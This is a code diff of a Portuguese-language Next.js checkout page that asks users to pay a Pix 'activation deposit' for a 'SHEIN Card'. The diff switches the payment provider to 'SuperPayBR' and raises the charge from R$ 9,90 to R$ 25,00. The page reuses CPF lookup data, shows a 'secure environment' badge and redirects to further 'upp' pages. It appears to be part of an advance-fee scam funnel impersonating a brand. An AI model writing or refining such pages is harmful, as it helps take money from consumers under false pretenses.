@@ -19,14 +19,14 @@ export default function UppCheckoutPage() {
   const { isConfirmed } = usePureWebhookMonitor({
     invoiceId: invoice?.external_id,
     onConfirmed: () => {
-      console.log("✅ Pagamento de ativação confirmado via webhook!")
+      console.log("✅ Pagamento de ativação SuperPayBR confirmado via webhook!")
       // Redirecionar para /upp10 em vez de /upp/success
       setTimeout(() => {
         router.push("/upp10")
       }, 1000)
     },
     onError: (error) => {
-      console.error("❌ Erro no webhook:", error)
+      console.error("❌ Erro no webhook SuperPayBR:", error)
     },
   })
 
@@ -35,7 +35,7 @@ export default function UppCheckoutPage() {
     const cpfData = JSON.parse(localStorage.getItem("cpfConsultaData") || "{}")
     setUserName(cpfData.nome?.split(" ")[0] || "")
 
-    // Criar fatura de ativação
+    // Criar fatura de ativação SuperPayBR
     createActivationInvoice()
   }, [])
 
@@ -53,13 +53,13 @@ export default function UppCheckoutPage() {
     try {
       setLoading(true)
 
-      const response = await fetch("/api/tryplopay/create-activation-invoice", {
+      const response = await fetch("/api/superpaybr/create-activation-invoice", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
         },
         body: JSON.stringify({
-          amount: 9.9,
+          amount: 25.0,
           description: "Depósito de Ativação - SHEIN Card",
         }),
       })
@@ -69,10 +69,10 @@ export default function UppCheckoutPage() {
       }
 
       const data = await response.json()
-      setInvoice(data)
-      localStorage.setItem("activationInvoice", JSON.stringify(data))
+      setInvoice(data.data)
+      localStorage.setItem("activationInvoiceSuperPayBR", JSON.stringify(data.data))
     } catch (error) {
-      console.error("Erro ao criar fatura de ativação:", error)
+      console.error("Erro ao criar fatura de ativação SuperPayBR:", error)
     } finally {
       setLoading(false)
     }
@@ -102,7 +102,7 @@ export default function UppCheckoutPage() {
         <div className="bg-white rounded-2xl shadow-xl p-8 max-w-md w-full mx-4">
           <div className="text-center">
             <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500 mx-auto mb-4"></div>
-            <h2 className="text-xl font-bold mb-2">Processando...</h2>
+            <h2 className="text-xl font-bold mb-2">Processando SuperPayBR...</h2>
             <p className="text-gray-600">Criando fatura de ativação</p>
           </div>
         </div>
@@ -147,7 +147,7 @@ export default function UppCheckoutPage() {
             </h1>
 
             <p className="text-gray-600 text-sm mb-4">
-              Para ativar seu cartão SHEIN, é necessário fazer um depósito de ativação de R$ 9,90. Este valor será
+              Para ativar seu cartão SHEIN, é necessário fazer um depósito de ativação de R$ 25,00. Este valor será
               creditado como limite no seu cartão após a aprovação.
             </p>
           </div>
@@ -159,12 +159,12 @@ export default function UppCheckoutPage() {
                 <span className="text-lg font-bold">Pague via Pix</span>
                 <div className="w-6 h-6 bg-teal-500 rounded"></div>
               </div>
-              <p className="text-sm text-gray-600">Confirmação automática via webhook</p>
+              <p className="text-sm text-gray-600">Confirmação automática via webhook SuperPayBR</p>
             </div>
 
             {/* Amount */}
             <div className="text-center mb-6">
-              <p className="text-4xl font-bold text-teal-600">R$ 9,90</p>
+              <p className="text-4xl font-bold text-teal-600">R$ 25,00</p>
               <p className="text-sm text-gray-500">Depósito de Ativação</p>
             </div>
 
@@ -211,7 +211,7 @@ export default function UppCheckoutPage() {
             {/* Security */}
             <div className="flex items-center justify-center space-x-2 text-gray-600 mb-4">
               <Shield className="w-4 h-4" />
-              <span className="text-sm">Ambiente seguro</span>
+              <span className="text-sm">Ambiente seguro SuperPayBR</span>
             </div>
           </div>
 
